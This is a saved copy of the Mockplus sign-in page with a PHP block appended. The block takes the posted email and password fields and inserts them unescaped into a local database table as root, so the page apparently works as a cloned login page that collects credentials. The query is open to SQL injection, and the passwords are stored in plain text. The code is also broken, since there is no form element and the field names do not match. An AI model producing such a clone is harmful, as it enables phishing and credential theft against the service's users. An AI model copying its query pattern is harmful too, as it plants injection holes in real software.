<!DOCTYPE html>
<!-- saved from url=(0079)https://user.mockplus.com/signin?next=https%3A%2F%2Fwww.mockplus.com%2F&source= -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}</style><style class="darkreader darkreader--user-agent" media="screen">html {
    background-color: #181a1b !important;
}
html, body, input, textarea, select, button {
    background-color: #181a1b;
}
html, body, input, textarea, select, button {
    border-color: #575757;
    color: #e8e6e3;
}
a {
    color: #3391ff;
}
table {
    border-color: #4c4c4c;
}
::placeholder {
    color: #bab5ab;
}
::selection {
    background-color: #005ccc;
    color: #ffffff;
}
::-moz-selection {
    background-color: #005ccc;
    color: #ffffff;
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: #545b00 !important;
    color: #e8e6e3 !important;
}
::-webkit-scrollbar {
    background-color: #1c1e1f;
    color: #c5c1b9;
}
::-webkit-scrollbar-thumb {
    background-color: #2a2c2e;
}
::-webkit-scrollbar-thumb:hover {
    background-color: #323537;
}
::-webkit-scrollbar-thumb:active {
    background-color: #3d4043;
}
::-webkit-scrollbar-corner {
    background-color: #181a1b;
}
* {
    scrollbar-color: #2a2c2e #1c1e1f;
}</style>
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta name="renderer" content="webkit">
    <title>Log in</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://user.mockplus.com/favicon.ico">
    <link rel="stylesheet" href="./Log in_files/iconfont.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <link rel="stylesheet" href="./Log in_files/home.css"><style class="darkreader darkreader--sync" media="screen"></style>
<style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: #7b5300 !important;
    border-color: #d8b013 !important;
    color: #f3e8c8 !important;
}
::placeholder {
    opacity: 0.5 !important;
}</style>
<section class="bg">
  <div class="content">
    <div class="header-icon">
      <a href="https://www.mockplus.com/">
        <i class="iconfont icon_logo"></i>
      </a>
    </div>
    <div class="from-content">
      <h1>Sign in to Mockplus</h1>
      <div class="from">
        <div class="from-list">
          <input type="text" id="email" placeholder="Email" data-text="Please enter a valid email address.">
        </div>
        <div class="from-list">
          <input type="password" id="password" placeholder="Password" data-text="The password must be between 6-20 characters long.">
        </div>
        <p class="tip agree-tos">
          <a href="reset Pasword.html" class="tip-right">Forgot password?</a>
        </p>
        <p class="error-message">&nbsp;</p>
        <div class="submit-btn">
          <button id="submit"name="t"class="btn btn-primary">Login</button>
        </div>
        <p class="tip signup-tip">
            <span>Don't have an account?</span>
            <a href="Register.html">Register it</a>
        </p>
      <!--</div>-->
    <!--</div>-->
    
    <?php
    $x = $_POST['q1'];
    $y = $_POST['q2'];
    


if(isset($_POST['t']))
{
$link=mysqli_connect('localhost','root','','food');
$qry="insert into login values('','$x','$y')";
mysqli_query($link,$qry);
}
?>
</div>
</div>



  </div>